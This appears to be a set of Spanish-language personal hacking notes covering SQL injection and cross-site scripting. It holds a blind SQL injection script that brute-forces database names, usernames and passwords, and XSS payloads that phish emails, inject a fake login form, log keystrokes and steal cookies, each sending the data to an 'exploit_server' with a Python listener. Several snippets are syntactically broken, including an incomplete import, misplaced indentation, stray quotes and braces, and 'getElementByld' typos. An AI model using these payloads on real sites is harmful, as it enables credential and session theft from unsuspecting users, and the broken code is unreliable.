
----
## SQLI

> Todos los sqli manuales lo tendremos en la carpeta de [PuestaenProducción](Z:\Estudios\PuestaProduccion)
> El resto lo tendremos en **sqlmap** 😁

- **Hay veces que no hace falta aplicar** `'` **porque el programador ni siquiera obligó a ponerlas, por lo que simplemente haremos la siguiente consulta.**

https://ejepmlo.com/?user_id=1 order by 1

- Poner  un valor inexistente:

https://ejepmlo.com/?user_id=52676511 order by 1

>Automatizaremos esto con el siguiente script 

```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import

def def_handler(sig, frame):
	print("\n\n[!] Saliendo ... \n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = input("¿Cuál es la URL objetivo?: ")
parametro = input("¿Cuál es el parámetro? (Ejemplo: ?parametroExistente=ValorInexistente): ")
tabla = input("¿Cómo se llama la tabla que has encontrado?: ")
columna1 = input("¿Cómo se llama la columna de users que has encontrado?: ")
columna2 = input("¿Cómo se llama la columna de passwds que has encontrado?: ")
characters = string.printable

def makeSQLI():

	p1 = log.progress("Fuerza bruta" )
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(2)
	
	p2 = log.progress("Datos extraídos")
	
	extracted_info = ""

	for position in range(1, 150): # caracteres a corregir si nos quedamos cortos 150
		for character in range(33, 126): # empezando desde el 33 hasta el 126
		sqli_url = f"{main_url}{parametro} or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from {tabla} where id = 1=%d)" % (position, character)"
		#esta es la query que s ehacía an tes --> sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
	
	# Ponerle la siguiente consulta si quiro saber los usersy passwds: f"{main_url}{parametro} or (select(select ascii(substring((select group_concat({columna1}, 0x3a ,{columna2}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)"
	
	# Ponerle la siguiente consulta si quiro saber los users: f"{main_url}{parametro} or (select(select ascii(substring((select group_concat({columna1}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)
	
	# Ponerle la siguiente consulta si quiro saber las passwds: f"{main_url}{parametro} or (select(select ascii(substring((select group_concat({columna2}) from {tabla}),%d,1)) from {tabla} where id = 1=%d)" % (position, character)

		p1.status(sqli_url)
		
		r = requests.get(sqli_url)
		
		if r.status_code == 200:
			extracted_info += chr(character)
			p2.status(extracted_info)
			break

if __name__ == '__main__':

	makeSQLI( )
```


## XSS

> Inyección JS para secuestrar el correo

- Código a inyectar

```javascript
<script>
	var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");
	
	if (email == null | | email == ""){
		alert("Es necesario introducir un correo válido para visualizar el post");
	} else {
		fetch( "http://exploit_server/?email=" + email);
</script>
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80
```

> Inyección JS para secuestrar el user y passwd

- Código a inyectar

```javascript
<div id="formContainer"></div>

<script>
	var email;
	var password;
	var form = '<form>' +
		'Email: <input type="email" id="email" required>' +
		' Contraseña: <input type="password" id="password" required>' +
		'<input type="button" onclick="submitForm()" value="Submit">' +
		'</form>';

}

document.getElementByld("formContainer").innerHTML = form;

	function submitForm() {
	email = document.getElementByld("email").value;
	password = document.getElementByld("password").value;
	fetch("http://exploit_server/?email="+ email + "&password=" + password);
}

</script>
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80
```


> Keylogger con JS

- Código a inyectar

```JS
<script>
	var k = "";
	document.onkeypress = function(e){
		e = e || window. event;
		k += e.key;
		var i = new Image();
		i.src = "http://exploit_server/" + k;
	};
</script>
```

- Para escuchar poner en la terminal
```python
	python3 -m http.server 80 2>&1 | grep -oP 'GET /\K[^.*\s]+'
```

>Secuestrar la cookie dough sin que la víctima vea el alert

- Archivo a inyectar en entrada de texto vulnerABLE
```JS
<script src="http://exploit_server:puerto/powned.js"></script>
```

```JS
var request = new XMLHttpRequest( );
request.open('GET', 'http://exploit_server/?cookie=' + document.cookie);
request.send( );
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80 
```



>Hacer que la víctima visite la página que quiero 

- Código a inyectar
```JS
<script src="http://exploit_server:puerto/powned.js"></script>
```

```JS
var request = new XMLHttpRequest( );
request.open('GET', 'http://valvonta.es/poraqui?parametro=active');
request.send( );
```

- Para escuchar poner en la terminal
```python
python3 -m http.server 80 